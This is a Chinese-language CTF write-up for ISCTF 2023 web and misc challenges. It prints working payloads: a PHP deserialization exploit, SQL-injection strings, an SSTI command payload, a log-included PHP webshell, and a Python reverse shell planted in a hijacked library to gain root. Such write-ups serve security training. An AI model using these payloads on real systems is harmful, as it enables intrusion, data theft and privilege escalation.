---
title: ISCTF 2023 
description: web&misc wp
tags:
  - CTF
  - MISC
  - WEB
categories:
  - write up
swiper_index: 3
cover: 'https://tuchuang.voooe.cn/images/2024/03/19/7c125e71d6bd478aa288abe3ac25672e.png'
abbrlink: ISCTF2023[3]
date: 2024-03-07 21:47:00
---
## web

### 圣杯战争!!!

php 反序列化

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class artifact{
    public $excalibuer;
    public $arrow;
    public function __toString(){
        echo "为Saber选择了对的武器!<br>";
        return $this->excalibuer->arrow;
    }
}

class prepare{
    public $release;
    public function __get($key){
        $functioin = $this->release;
        echo "蓄力!咖喱棒！！<br>";
        return $functioin();
    }
}
class saber{
    public $weapon;
    public function __invoke(){
        echo "胜利！<br>";
        include($this->weapon);
    }
}
class summon{
    public $Saber;
    public $Rider;

    public function __wakeup(){
        echo "开始召唤从者！<br>";
        echo $this->Saber;
    }
}

if(isset($_GET['payload'])){
    unserialize($_GET['payload']);
}
?>
```

**POP 链：summon->artifact->prepare->saber**

EXP：

```php
<?php
class artifact{
    public $excalibuer;
    public $arrow;
}

class prepare{
    public $release;
}
class saber{
    public $weapon;
}
class summon{
    public $Saber;
    public $Rider;
}
$artifact=new artifact();
$prepare=new prepare();
$saber=new saber();
$summon=new summon();
$summon->Saber=$artifact;
$artifact->excalibuer=$prepare;
$prepare->release=$saber;
$saber->weapon="php://filter/read=convert.base64-encode/resource=flag.php";

echo serialize($summon);

?>
```
**?payload=O:6:"summon":2:{s:5:"Saber";O:8:"artifact":2:{s:10:"excalibuer";O:7:"prepare":1:{s:7:"release";O:5:"saber":1:{s:6:"weapon";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}s:5:"arrow";N;}s:5:"Rider";N;}**

### where_is_the_flag

rce


当前目录下一个

![](https://s2.loli.net/2024/03/07/T37YuLFAjGsdvgC.png)

根目录下一个

![](https://s2.loli.net/2024/03/07/9Xjx8ucktANGh6D.png)

环境变量里一个

![](https://s2.loli.net/2024/03/07/9ZrGKBpFCe8PET1.png)

### 绕进你的心里

md5 绕过，正则回溯绕过


![](https://s2.loli.net/2024/03/07/kIx6KeibftYzADa.png)

**md5和第一个preg都用数组绕过
然后第二个preg和strpos组合的话用正则回溯绕过**

payload:

```python
import requests

data={"pan_gu":"a"*1000000+"2023ISCTF"}
url="http://43.249.195.138:22110/?hongmeng[]=1&shennong[]=2&zhurong[]=a"
res = requests.post(data=data,url=url)

print(res.text)
```

![](https://s2.loli.net/2024/03/07/SMP2VWHLE8nZ47r.png)

### easy_website

sql 注入


> 同款题：[SWPUCTF 2022 新生赛]ez_sql


过滤 or select 用双写绕过

空格用/**/绕过

查当前库

![](https://s2.loli.net/2024/03/07/3plwOIZF4ygvMR5.png)

查当前库下的表

![](https://s2.loli.net/2024/03/07/CBw7UXKL5e6kDYG.png)

列出全部列的内容，最后发现是 password 里有 flag

payload：
**
POST:
username=0'/\*\*/uunionnion/\*\*/sselectelect/\*\*/group_concat(passwoorrd)/\*\*/from/\*\*/users.users/\*\*/#&password=
**

![](https://s2.loli.net/2024/03/07/W5tbjLHzCDcqh97.png)

### Wafr

RCE


![](https://s2.loli.net/2024/03/07/zNRsZE8wtJ3TQMr.png)

**payload：
POST：
code=system('ca\t /f*')%0a
**

### webinclude

逆向算法，伪协议


打开就要参数

![](https://s2.loli.net/2024/03/07/n9dCMHXQZlzOgSB.png)

dirsearch 扫下备份文件

![](https://s2.loli.net/2024/03/07/A3noeDOUgtcBLaJ.png)

下载 index.bak 查看源码

![](https://s2.loli.net/2024/03/07/2XjCdLoy5Il3Ot7.png)

定义了两个函数，并且利用这两个函数对原本的参数名进行了加密处理

最后加密结果为 dxdydxdudxdtdxeadxekdxea

写个逆向脚本再反求 parameter 即可

```javascript
const hash = 'dxdydxdudxdtdxeadxekdxea';

function string_to_int_array(str) {
  const intArr = [];
  for (let i = 0; i < str.length; i++) {
    intArr.push(str.charCodeAt(i) - 97);
  }
  return intArr;
}

function int_array_to_string(int_array) {
  let str = '';
  for (let i = 0; i < int_array.length; i += 2) {
    const charcode = int_array[i] * 26 + int_array[i + 1];
    str += String.fromCharCode(charcode);
  }
  return str;
}

console.log(int_array_to_string(string_to_int_array(int_array_to_string(string_to_int_array(hash)))));
```

![](https://s2.loli.net/2024/03/07/gulBGwbQrzPZAFn.png)

得到参数名:mihoyo

**?mihoyo=php://filter/read=convert.base64-encode/resource=flag.php**

伪协议直接读，解码 base64 即可

### ez_ini

文件上传  .user.ini



上传.user.ini 文件


	GIF89A
	auto_append_file="/var/log/nginx/access.log"


UA 头添加木马：

```php
<?php @eval($_POST['shell']);?
```

![](https://s2.loli.net/2024/03/07/dXTVW1RfPrceQ6H.png)

**POST:
shell=system('tac /flag');**

![](https://s2.loli.net/2024/03/07/6f4buS1pxIn8ad2.png)

### fuzz!

fuzz RCE



![](https://s2.loli.net/2024/03/07/G5jpt7KPxRogcIS.png)

flag 在/flaggggggg.txt 中，要 bypass

fuzz 脚本

```php
<?php
for ($i = 32; $i < 129; $i++) {
    if (!preg_match("/\`|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\\\\|\'|\"|\;|\<|\>|\,|\?|jay/i", $i)) {
        echo chr($i);
    }
}
?>
```

![](https://s2.loli.net/2024/03/07/6y2YwifRMZArQXm.png)

**排除数字和字母后只剩以下符号可用
-./:[]{|} 空格**

"|"没 ban，可以放在开头结束前面的 curl，然后拼接我们自己的系统命令

flag 关键字过滤可以用"[]"正则匹配绕过

**paylaod：
?file=|tac /fl[a-z]ggggggg.txt**

![](https://s2.loli.net/2024/03/07/1qItky4BCg7GJHe.png)

### 1z_Ssql

布尔盲注

![](https://s2.loli.net/2024/03/07/uZfO2QxI7wGaErc.png)

先摸索了一下，发现 union 和=号过滤

过滤等于号，改用 > 号即可

union 过滤就用不了联合查询注入了，考虑布尔盲注

**admin' and length(database()) > 1#爆破当前数据库长度**

![](https://s2.loli.net/2024/03/07/ayCFQdEWUMjJ9LH.png)

爆到 6 报错，说明当前数据库长度为 6

继续爆库名

从第一位开始，从 a 字母开始

**admin' and substr(database(),1,1) > 'b' #第一位为b
admin' and substr(database(),2,1) > 't' #第二位为t**

后面爆出当前库名字就是出题人名字：**bthcls**

附件拿到两个字典，应该是表和列的，使用 bp 来爆破

**admin' and substr((select §xx§ from bthcls.§xx§ limit 0,1),1,1)>'a' #**

![](https://s2.loli.net/2024/03/07/Ed6bmg59KJwAvux.png)

根据返回长度找到对应表 列

![](https://s2.loli.net/2024/03/07/eahXgWJVBZPMFmj.png)

得到 **bthcls.users.password 有值**

爆数据，字典为 32-127 纯数字（可打印字符的 ascii 十进制值）

**admin'and ascii(substr((select group_concat(password)from bthcls.users limit 0,1),1,1))>§32§ #**

![](https://s2.loli.net/2024/03/07/VwDmhk4XSsIZPb1.png)

得到第一位的 asciii 码十进制为 119

后续相同操作一直爆，最后爆出完整密码：119 101 49 99 111 109 101 55 111 49 115 99 116 102

对应字符：**we1come7o1sctf**

**账号：admin
密码：we1come7o1sctf**

![](https://s2.loli.net/2024/03/07/gGfXvAlykiY3UIz.png)

### 恐怖 G7 人

ssti


无过滤 ssti，直接注入，flag 在环境变量里

    {{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('env').read()")}}

![](https://s2.loli.net/2024/03/07/doZmUc3WY6glCIi.png)

## MISC

### 签到题

二维码拼接


![](https://s2.loli.net/2024/03/07/pone3zbMPx1Zk5r.png)

附件拿到 PS 拼接

![](https://s2.loli.net/2024/03/07/MepqBQ1ImKv48Ok.png)

扫码回复题目要求信息即可得到 flag

### 杰伦可是流量明星

流量分析


拿到 mp3 文件，binwalk 出一个压缩包

![](https://s2.loli.net/2024/03/07/qk3dYbD72gAatIm.png)

wireshark 打开

在 tcp.stream eq 2 中找到 flag

![](https://s2.loli.net/2024/03/07/yVDqCJQUuocOKPS.png)

### 你说爱我？尊嘟假嘟

Ook! base64



![](https://s2.loli.net/2024/03/07/YxqJadjny5iUP6g.png)

你说爱我替换为 Ook.

尊嘟替换为 Ook!

假嘟替换为 Ook?

[https://www.splitbrain.org/services/ook](https://www.splitbrain.org/services/ook)

解得：

**ild3l4pXejwPcCwJsPAOq7sJczdRdTsJcCEUsP1Z**

再 base64 解密

![](https://s2.loli.net/2024/03/07/FCwidI4jy5BL3GN.png)

### easy_zip

密码爆破



6 位数字爆破密码即可

![](https://s2.loli.net/2024/03/07/8vNeXgDqyKuzhRo.png)

### 蓝鲨的福利

  png 文件头



010 打开添加 89504E47 后保存为 png 文件打开即可

![](https://s2.loli.net/2024/03/07/EeqrGJFsjRg8VO1.png)

### EZcrc

  crc 爆破



附件拿到 zip 文件

![](https://s2.loli.net/2024/03/07/IOzjEDH9SnRwkgm.png)

[https://github.com/AabyssZG/CRC32-Tools](https://github.com/AabyssZG/CRC32-Tools)

Python xxx.py -3 文件名（zip 放同目录下）

工具提取下 crc 值

![](https://s2.loli.net/2024/03/07/JRi1MmxzXbeIF36.png)

排下顺序

```python
# 读取整个文本文件内容
with open('C:/Users/Nanian233/Desktop/a.txt', 'r') as file:
    content = file.readlines()

# 提取文件名和对应的十六进制数值，放入元组列表
data = [(line.split(':')[0].strip(), int(line.split(':')[1].strip(), 16)) for line in content]

# 按照文件名的数字顺序对元组列表进行排序
sorted_data = sorted(data, key=lambda x: int(x[0].split('.')[0].split()[-1]))

# 输出排序后的结果
for entry in sorted_data:
    print(f"{entry[0]}: {hex(entry[1])}")
```

改为标准格式

```python
import re

def extract_hex(file_content):
    # 使用正则表达式匹配每一行txt后面的十六进制数据
    hex_values = re.findall(r'\[OK\] \d+\.txt: (0x[0-9a-fA-F]+)', file_content)

    # 将十六进制数据用逗号隔开，头尾套上方括号
    result_str = '[' + ','.join(hex_values) + ']'

    return result_str

if __name__ == '__main__':
    # 用于测试的示例文本，你需要替换成你的实际文本
    example_text = """
    [OK] 0.txt: 0xd2b184ff
    [OK] 1.txt: 0xb462df74
    [OK] 2.txt: 0x32973a9e
    ... (其他行)
    [OK] 217.txt: 0xef809c83
    """

    result = extract_hex(example_text)
    print(result)
```

爆破脚本 [blog.csdn.net](https://blog.csdn.net/mochu7777777/article/details/110206427)

```python
import zlib

crc_list = [xxxx]# 遍历所有可能的3字节数据
for target_crc in crc_list:
    for i in range(256):
        for j in range(256):
            for k in range(256):
                data = bytes([i, j, k])  # 构造3字节数据
                crc = zlib.crc32(data) & 0xffffffff  # 计算CRC32值
                if crc == target_crc:
                    data=data.decode()
                    print(f"Found matching data: {data}")
                    break

print("Finished searching.")
```

手工分离一下

![](https://s2.loli.net/2024/03/07/HX1TDyon5POFaSz.png)

字母表：[https://www.xuezimu.com.cn/info/26zimu.php](https://www.xuezimu.com.cn/info/26zimu.php)

对照翻译后得到

U1ZORFZFWjdNV1EzTnpjMVpXUXRZV1JoTUMwMFl6WTNMV0l4T0RVdE1HSXpZelF4WXpsa05tUXlmUT09

两段 base64 解密得到 flag

![](https://s2.loli.net/2024/03/07/udqzED98Y6HIc5M.png)

### 镜流

密码爆破，像素提取，lsb 隐写



bandizip 爆破压缩包密码

![](https://s2.loli.net/2024/03/07/2dpqIn6SuFLNX3c.png)

查看 hint：

![](https://s2.loli.net/2024/03/07/UkGpOyEJAWXiuj7.png)

想起了 GDOUCTF2023 的题目了

[2023 广东海洋大学 GDOUCTF Writeup By AheadSec_末 初的博客-CSDN 博客](https://blog.csdn.net/mochu7777777/article/details/130188571)

![](https://s2.loli.net/2024/03/07/Fm3xKoygJGcWI1d.png)

借用师傅的脚本，改 12 为 10 即可

```python
from PIL import Image

img = Image.open('arcaea.png')
w = img.width
h = img.height
img_obj = Image.new("RGB",(w//10,h//10))

for x in range(w//10):
    for y in range(h//10):
        (r,g,b)=img.getpixel((x*10,y*10))
        img_obj.putpixel((x,y),(r,g,b))

img_obj.save('ok.png')
```

提取出一个新的 png 图片

![](https://s2.loli.net/2024/03/07/IN69fFuCcXEjosS.png)

zsteg 查看发现还藏了一张图在 lsb 最低位处

![](https://s2.loli.net/2024/03/07/iGf5aH9V2mzQORL.png)

zsteg -e b1,rgb,lsb,xy ok.png -> out.png 提取出来得到 flag

![](https://s2.loli.net/2024/03/07/QZ4foU9IYH2aeOT.png)

### ezUSB

蓝牙流量，usb 流量



wireshark 分析流量特征，发现有蓝牙和 usb 流量

![](https://s2.loli.net/2024/03/07/DIXe8Ocdvgu3bN9.png)

tshark- T json -r 题目.pcapng >output.json

提取数据以 json 格式

usb 流量：

strings output.json | grep "usbhid.data">1.txt（提取 usb 流量）

![](https://s2.loli.net/2024/03/07/VTtxzoeFgSOLAsv.png)

去掉字段名和开头的 01 字节，并取随后的 8byte 保存

![](https://s2.loli.net/2024/03/07/O2REk5GUf9oLSsj.png)

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
output = []
keys = open('change.txt')#数据文件路径
for line in keys:
    try:
        if line[0]!='0' or (line[1]!='0' and line[1]!='2') or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0' or line[6:8]=="00":
             continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]=='2']
        else:
            output += ['[unknown]']
    except:
        pass
keys.close()

flag=0
print("".join(output))
for i in range(len(output)):
    try:
        a=output.index('<DEL>')
        del output[a]
        del output[a-1]
    except:
        pass
for i in range(len(output)):
    try:
        if output[i]=="<CAP>":
            flag+=1
            output.pop(i)
            if flag==2:
                flag=0
        if flag!=0:
            output[i]=output[i].upper()
    except:
        pass
print ('output :' + "".join(output))
```

得到后半段 flag

![](https://s2.loli.net/2024/03/07/FnhbC6zQW3XmqLO.png)

收集删除的字符可以发现 key：**soezusb**

蓝牙流量：

strings output.json | grep "btatt.value">2.txt

修改下格式后保存，依旧使用上面的脚本

![](https://s2.loli.net/2024/03/07/JRcHdn8b4WLGTrA.png)

![](https://s2.loli.net/2024/03/07/Kdmh32T5olVs4Gz.png)

先进行 flag 连接：

**AGGSZ{Kp_wn_YRV_SOV_JMFYFFJS!!!}**
**key：soezusb**

维吉尼亚密码

![](https://s2.loli.net/2024/03/07/f2xZnT79cqBKV34.png)

**ISCTF{So_ez_USB_AND_VIGENERE!!!}**

### 小蓝鲨的秘密

伪加密，宽高隐写，aes 加密



伪加密

改两个 00 即可

![](https://s2.loli.net/2024/03/07/6esNTR9fXqFUOMZ.png)

![](https://s2.loli.net/2024/03/07/3FaufvHqpodQ2TE.png)

png 图片拉下宽高

![](https://s2.loli.net/2024/03/07/sCSZJnzBOiIgemK.png)

得到 key:15CTF2023

![](https://s2.loli.net/2024/03/07/F9uZg51HYUlPq2B.png)

解密 AES 即可

[在线 AES 加密 | AES 解密 - 在线工具](https://www.sojson.com/encrypt_aes.html)

![](https://s2.loli.net/2024/03/07/5IkxUAoECpFad1H.png)

### Ez_misc

  ppt 隐写，jpg 文件头



拿到附件

![](https://s2.loli.net/2024/03/07/iyFN4JZH5pusWh7.png)

ppt 最后一张图备注处拿到密码：M13c_!ps2s23

![](https://s2.loli.net/2024/03/07/U5b1OBx9clQARtF.png)

解压 flag.zip 后发现 jpg 文件打不开

![](https://s2.loli.net/2024/03/07/5lzPGWVqtoricYw.png)

010 打开后发现文件头缺失，补充即可

![](https://s2.loli.net/2024/03/07/bGyqtM8rOmXUWhQ.png)

打开得到二维码，扫码得到 flag

![](https://s2.loli.net/2024/03/07/VGQmbn8Bsj6u3Kg.png)

### spalshes

散点图



预期解：

![](https://s2.loli.net/2024/03/07/u2wZ9zPcVaiKrCg.png)

解密文本拿到点坐标

```python
import matplotlib.pyplot as plt 
# 提供的数据 
data =[1,2.75,1,1,2.5,1,1,2.25,1,1,1.75,1,1,2,1,1,3,1,1.5,3,1,2,3,1,2,2.75,1,2,2.5,1,2,2.25,1,2,2,1,2,1.75,1,2,1.5,1,1,2.25,1,1.5,2.25,1,1,1.5,1,1.5,1.5,1,
4,2.75,1,4,2.5,1,3,3,1,3.5,3,1,4,3,1,3.5,2.25,1,4,2.25,1,4,2,1,4,1.75,1,4,1.5,1,3,1.5,1,3.5,1.5,1,3,2.25,1,3,2.5,1,3,2.75,1,
5,3,1,5.5,3,1,6,3,1,6,2.25,1,6,2,1,6,1.75,1,6,1.5,1,5.5,1.5,1,5,1.5,1,5,2.25,1,5.5,2.25,1,5,2.5,1,5,2.75,1,
7,3,1,7.5,3,1,8,3,1,8,2.5,1,8,2,1,8,1.5,1,8,2.75,1,8,2.25,1,8,1.75,1,
9,3,1,9.5,3,1,10,3,1,10,2.75,1,10,2.5,1,10,2.25,1,9.5,2.25,1,9,2.25,1,9,1.5,1,9.5,1.5,1,10,1.5,1,10,2,1,10,1.75,1,
11.5,3,1,12,3,1,11,3,1,12,2.25,1,12,2,1,12,1.75,1,12,1.5,1,11.5,1.5,1,11,1.5,1,11,1.75,1,11,2,1,11,2.25,1,11,2.5,1,11,2.75,1,11.5,2.25,1]
# 将数据分割成 x 和 y 坐标 
x = data[::3] 
y = data[1::3] 
# 绘制散点图 
plt.scatter(x,y) 
plt.title('Scatter Plot') 
plt.xlabel('X-axis') 
plt.ylabel('Y-axis') 
plt.show()
```

![](https://s2.loli.net/2024/03/07/TAW8EfrD1cFsn6q.png)

拿到密码后解压得到二维码，扫码获得 flag

非预期解：

直接爆破 6 位纯数字

![](https://s2.loli.net/2024/03/07/xZK3Stws7N5XMRp.png)

> 出题人年轻了

### 张万森，下雪了

字典爆破，base64 套娃，字频统计，SNOW 隐写



附件拿到 zip 和字典

![](https://s2.loli.net/2024/03/07/bmzOEZS8uXy9iGA.png)

字典爆破出密码：blueSHARK666

![](https://s2.loli.net/2024/03/07/2bgBrZwiPJ5sKxv.png)

结合题目推测 flag.txt 内有 snow 隐写

![](https://s2.loli.net/2024/03/07/sfeEJZGxwb8YajS.png)

hint.txt 先进行 base64 17 次解密后再进行字频统计得到密码：ISCTFZ023

![](https://s2.loli.net/2024/03/07/AbpvR7zmDK2iBF5.png)

snow 解密即可

![](https://s2.loli.net/2024/03/07/zX8uqfJdRiGSsZM.png)

### MCSOG-猫猫

零宽隐写



![](https://s2.loli.net/2024/03/07/4rRvZxKAkB2o8pN.png)

在群里发送指定消息

![](https://s2.loli.net/2024/03/07/2o3sPZKGRXQy7f6.png)

复制信息到 vim 中发现有零宽隐写

![](https://s2.loli.net/2024/03/07/ZCiBA98aeXTDlHy.png)

[https://www.mzy0.com/ctftools/zerowidth1/](https://www.mzy0.com/ctftools/zerowidth1/)

勾选 200C 202C 200E 即可

![](https://s2.loli.net/2024/03/07/C1uFAGI5joTWi42.png)

### stream

  盲注日志分析



![](https://s2.loli.net/2024/03/07/nue3lE6wSBqrW4x.png)

发现是盲注流量，Tshark 提取一下

tshark -r xxx.pcapng -Y "http.request" -T fields -e http.request.full_uri > data.txt

删除一些其他数据并 url 解码后就得到完整的盲注日志了

![](https://s2.loli.net/2024/03/07/mwIU5qdKTohs8AY.png)

[BUU 流量分析 sqltest - 云千 - 博客园](https://www.cnblogs.com/yunqian2017/p/15124198.html)

```python
# 读取输入文件
with open('xxx', 'r') as file:
    lines = file.readlines()

# 初始化上一行指定位置的数字
prev_digit_position = 0

# 遍历每一行数据
for line in lines:
    # 获取当前行指定位置的数字
    start_index = line.find("SELECT flag from answer limit 0,1),") + len("SELECT flag from answer limit 0,1),")
    end_index = line.find(",1))=")
    
    if start_index != -1 and end_index != -1:
        digit_position = int(line[start_index:end_index])

        # 检查指定位置的数字是否发生变化
        if prev_digit_position + 1 == digit_position:
            # 输出当前行的上一行指定位置的数据
            prev_line = lines[lines.index(line) - 1]
            start_shuju = prev_line.find(",1))=") + len(",1))=")
            end_shuju = prev_line.find("--")
            print(chr(int(prev_line[start_shuju:end_shuju])),end="")

        # 更新上一行指定位置的数字
        prev_digit_position = digit_position
```

![](https://s2.loli.net/2024/03/07/QstlDVAmrOSBfkF.png)

### PNG 的基本食用

宽高 lsb binwalk



**图 1 修复宽高**

得到第一段 flag

![](https://s2.loli.net/2024/03/07/rtXqp23T7mwlVE9.png)

ISCTF{png-is-

**图 2 lsb 最低位**

![](https://s2.loli.net/2024/03/07/FUxJjnz3SeEgLto.png)

so-ez-

**图 3 binwalk 分离出压缩包**

![](https://s2.loli.net/2024/03/07/WD9hXMOy5LTVUFr.png)

解压得到第三段

![](https://s2.loli.net/2024/03/07/9YWnZt1T5LVNicC.png)

for-you}

**ISCTF{png-is-so-ez-for-you}**

### sudopy

python 库 提权 反弹 shell



![](https://s2.loli.net/2024/03/07/rEWsfX5OylNDdpK.png)

ssh -p 21269 ctf@43.249.195.138mailto:ctf@43.249.195.138

password：ctf

连接题目后，先 pwd 查看当前位置

![](https://s2.loli.net/2024/03/07/r3bGt5pJkE8Wso9.png)

ls -al 发现 flag 和一个 web.py 文件

![](https://s2.loli.net/2024/03/07/c1d5iXHb4Eop89M.png)

但是 flag 得 root 才能访问

sudo -l 显示出自己（执行 sudo 的使用者）的权限

![](https://s2.loli.net/2024/03/07/fRv5d3HzZlmp9uS.png)

发现/usr/bin/python3 /home/ctf/web.py 这样是可以 sudo 运行不需要密码的

看下 web.py 的内容

![](https://s2.loli.net/2024/03/07/tmWVefdR5ibku6c.png)

导入了一个叫 webbrowser 的库

找下它的位置

![](https://s2.loli.net/2024/03/07/4O7FQeEfIJqNi5T.png)

[Linux 权限提升:Python 库劫持 - FreeBuf 网络安全行业门户](https://www.freebuf.com/vuls/279298.html)

根据文章提到的操作，在 webbrowser.py 里放入反弹 shell

vim /usr/lib/python3.10/webbrowser.py

**反弹shell：import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机ip",监听端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);**

![](https://s2.loli.net/2024/03/07/iqYIE6DgpjoKuTh.png)

保存后退出，同时再开个终端连 vps，连上后 nc -lvnp 端口 开启监听

然后在靶机处执行命令：sudo /usr/bin/python3 /home/ctf/web.py

![](https://s2.loli.net/2024/03/07/nrqDMLHCWu5oh6c.png)

成功连接，并且是 root 权限

接着 cd /home/ctf   后 cat flag 即可

![](https://s2.loli.net/2024/03/07/rlt7EzReuFTgvV4.png)
